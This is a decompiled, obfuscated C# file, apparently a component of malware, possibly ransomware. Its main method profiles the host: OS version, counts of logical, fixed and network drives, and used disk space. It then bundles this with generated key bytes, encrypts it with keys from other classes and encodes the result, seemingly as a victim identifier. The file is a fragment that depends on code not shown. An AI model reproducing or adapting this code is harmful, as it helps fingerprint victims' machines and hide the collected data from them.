using System;
using System.IO;
using System.Runtime.CompilerServices;
using System.Text;
using Main;
using ns0;

namespace ns1;

internal sealed class Class6
{
	public sealed class Class7
	{
		[CompilerGenerated]
		private static string string_0;

		[CompilerGenerated]
		private static byte[] byte_0;

		[CompilerGenerated]
		private static byte[] byte_1;

		[CompilerGenerated]
		private static string string_1;

		[CompilerGenerated]
		private static string string_2;

		[CompilerGenerated]
		private static string string_3;

		[CompilerGenerated]
		private static string string_4;

		[CompilerGenerated]
		private static string string_5;

		[CompilerGenerated]
		private static string string_6;

		[CompilerGenerated]
		private static string string_7;

		[CompilerGenerated]
		private static int int_0;

		[CompilerGenerated]
		private static int int_1;

		[CompilerGenerated]
		private static int int_2;

		[CompilerGenerated]
		private static int int_3;

		[SpecialName]
		[CompilerGenerated]
		public static string smethod_0()
		{
			return string_0;
		}

		[SpecialName]
		[CompilerGenerated]
		public static void smethod_1(string string_8)
		{
			string_0 = string_8;
		}

		[SpecialName]
		[CompilerGenerated]
		public static byte[] smethod_2()
		{
			return byte_0;
		}

		[SpecialName]
		[CompilerGenerated]
		public static void smethod_3(byte[] byte_2)
		{
			byte_0 = byte_2;
		}

		[SpecialName]
		[CompilerGenerated]
		public static byte[] smethod_4()
		{
			return byte_1;
		}

		[SpecialName]
		[CompilerGenerated]
		public static void smethod_5(byte[] byte_2)
		{
			byte_1 = byte_2;
		}

		[SpecialName]
		[CompilerGenerated]
		public static string smethod_6()
		{
			return string_1;
		}

		[SpecialName]
		[CompilerGenerated]
		public static void smethod_7(string string_8)
		{
			string_1 = string_8;
		}

		[SpecialName]
		[CompilerGenerated]
		public static string smethod_8()
		{
			return string_2;
		}

		[SpecialName]
		[CompilerGenerated]
		public static void smethod_9(string string_8)
		{
			string_2 = string_8;
		}

		[SpecialName]
		[CompilerGenerated]
		public static string smethod_10()
		{
			return string_3;
		}

		[SpecialName]
		[CompilerGenerated]
		public static void smethod_11(string string_8)
		{
			string_3 = string_8;
		}

		[SpecialName]
		[CompilerGenerated]
		public static string smethod_12()
		{
			return string_4;
		}

		[SpecialName]
		[CompilerGenerated]
		public static void smethod_13(string string_8)
		{
			string_4 = string_8;
		}

		[SpecialName]
		[CompilerGenerated]
		public static string smethod_14()
		{
			return string_5;
		}

		[SpecialName]
		[CompilerGenerated]
		public static void smethod_15(string string_8)
		{
			string_5 = string_8;
		}

		[SpecialName]
		[CompilerGenerated]
		public static string smethod_16()
		{
			return string_6;
		}

		[SpecialName]
		[CompilerGenerated]
		public static void smethod_17(string string_8)
		{
			string_6 = string_8;
		}

		[SpecialName]
		[CompilerGenerated]
		public static string smethod_18()
		{
			return string_7;
		}

		[SpecialName]
		[CompilerGenerated]
		public static void smethod_19(string string_8)
		{
			string_7 = string_8;
		}

		[SpecialName]
		[CompilerGenerated]
		public static int smethod_20()
		{
			return int_0;
		}

		[SpecialName]
		[CompilerGenerated]
		public static void smethod_21(int int_4)
		{
			int_0 = int_4;
		}

		[SpecialName]
		[CompilerGenerated]
		public static int smethod_22()
		{
			return int_1;
		}

		[SpecialName]
		[CompilerGenerated]
		public static void smethod_23(int int_4)
		{
			int_1 = int_4;
		}

		[SpecialName]
		[CompilerGenerated]
		public static int smethod_24()
		{
			return int_2;
		}

		[SpecialName]
		[CompilerGenerated]
		public static void smethod_25(int int_4)
		{
			int_2 = int_4;
		}

		[SpecialName]
		[CompilerGenerated]
		public static int smethod_26()
		{
			return int_3;
		}

		[SpecialName]
		[CompilerGenerated]
		public static void smethod_27(int int_4)
		{
			int_3 = int_4;
		}
	}

	public static bool smethod_0()
	{
		try
		{
			string string_ = "Unknown";
			int int_ = 16;
			Class7.smethod_7(Miscellaneous.smethod_8(5));
			Class7.smethod_7(Class7.smethod_6().ToUpper());
			string text = Miscellaneous.smethod_6();
			if (text != null && !(text == ""))
			{
				if (text.Split(new char[1] { ',' })[0] == "")
				{
					Class7.smethod_11(string_);
				}
				else
				{
					Class7.smethod_11(text.Split(new char[1] { ',' })[0]);
				}
				if (text.Split(new char[1] { ',' })[1] == "")
				{
					Class7.smethod_13(string_);
				}
				else
				{
					Class7.smethod_13(text.Split(new char[1] { ',' })[1]);
				}
				if (text.Split(new char[1] { ',' })[2] == "")
				{
					Class7.smethod_19(string_);
				}
				else
				{
					Class7.smethod_19(text.Split(new char[1] { ',' })[2]);
				}
				if (text.Split(new char[1] { ',' })[3] == "")
				{
					Class7.smethod_17(string_);
				}
				else
				{
					Class7.smethod_17(text.Split(new char[1] { ',' })[3]);
				}
			}
			else
			{
				Class7.smethod_11(string_);
				Class7.smethod_13(string_);
				Class7.smethod_19(string_);
				Class7.smethod_17(string_);
			}
			string text2 = Miscellaneous.smethod_7();
			if (!string.IsNullOrEmpty(text2))
			{
				Class7.smethod_15(text2);
			}
			else
			{
				Class7.smethod_15(string_);
			}
			Class7.smethod_9(Environment.OSVersion.ToString());
			string[] logicalDrives = Environment.GetLogicalDrives();
			for (int i = 0; i < logicalDrives.Length; i++)
			{
				DriveInfo driveInfo = new DriveInfo(logicalDrives[i]);
				Class7.smethod_21(Class7.smethod_20() + 1);
				if (driveInfo.IsReady)
				{
					if (driveInfo.DriveType == DriveType.Fixed)
					{
						Class7.smethod_23(Class7.smethod_22() + 1);
					}
					if (driveInfo.DriveType == DriveType.Network)
					{
						Class7.smethod_25(Class7.smethod_24() + 1);
					}
					Class7.smethod_27(Class7.smethod_26() + Convert.ToInt32((driveInfo.TotalSize - driveInfo.TotalFreeSpace) / 1000000000L));
				}
			}
			Class7.smethod_3(Miscellaneous.smethod_9(Class4.Class5.smethod_42()));
			Class7.smethod_5(Miscellaneous.smethod_9(int_));
			string s = Miscellaneous.smethod_1(Class7.smethod_2()) + char.ToString(',') + Miscellaneous.smethod_1(Class7.smethod_4()) + char.ToString(',') + Class7.smethod_8() + char.ToString(',') + Class7.smethod_14() + char.ToString(',') + Class7.smethod_10() + char.ToString(',') + Class7.smethod_12() + char.ToString(',') + Class7.smethod_16() + char.ToString(',') + Class7.smethod_18() + char.ToString(',') + Convert.ToString(Class7.smethod_20()) + char.ToString(',') + Convert.ToString(Class7.smethod_22()) + char.ToString(',') + Convert.ToString(Class7.smethod_24()) + char.ToString(',') + Convert.ToString(Class7.smethod_26()) + char.ToString(',') + Convert.ToString(Class4.Class5.smethod_34()) + char.ToString(',') + Convert.ToString(Class4.Class5.smethod_1());
			byte[] bytes = Encoding.UTF8.GetBytes(s);
			byte[] array = Miscellaneous.smethod_9(Class4.Class5.smethod_40());
			bytes = Class8.smethod_1(bytes, array);
			array = Class8.smethod_2(array, Class4.Class5.smethod_38());
			byte[] byte_ = Miscellaneous.smethod_4(new byte[2][] { bytes, array });
			if (array == null)
			{
				return false;
			}
			Class7.smethod_1(Miscellaneous.smethod_11(Miscellaneous.smethod_0(byte_), 64));
			return true;
		}
		catch (Exception)
		{
		}
		return false;
	}
}
